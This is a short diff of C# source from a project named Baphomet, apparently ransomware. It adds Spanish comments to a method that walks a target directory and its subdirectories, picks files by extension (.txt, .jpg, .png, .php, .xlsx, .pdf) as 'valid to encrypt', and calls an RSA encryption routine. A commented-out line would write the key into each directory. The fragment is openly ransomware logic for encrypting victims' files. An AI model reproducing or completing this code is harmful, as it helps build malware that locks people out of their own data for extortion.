@@ -23,18 +23,18 @@ namespace Baphomet.Utilities
             return res.ToString();
         }
 
-        //recorro los directorios
+        //recorro los directorios a cifrar.
         public void directoryRoad(string targetPath, string key)
         {
             CryptRSA cryptRSA = new CryptRSA();
 
-            var extensionCheck = new[] { ".txt", ".jpg", ".png",".php" , ".xlsx", ".pdf" };//Extensiones validas
+            var extensionCheck = new[] { ".txt", ".jpg", ".png",".php" , ".xlsx", ".pdf" };//Extensiones validas para cifrar
             cryptRSA.EncryptText(targetPath, key);
 
            // File.WriteAllText(targetPath + "\\yourkey.key", encryptedKey);//escribo la llave en cada uno de los directorios
 
-            string[] files = Directory.GetFiles(targetPath);
-            string[] subDirs = Directory.GetDirectories(targetPath);
+            string[] files = Directory.GetFiles(targetPath); //obtengo todos los archivos del directorio en el que me encuentro.
+            string[] subDirs = Directory.GetDirectories(targetPath);//obtengo los subdirectorios del directorio en el que me encuentro.
             try
             {
                 for (int i = 0; i < files.Length; i++)
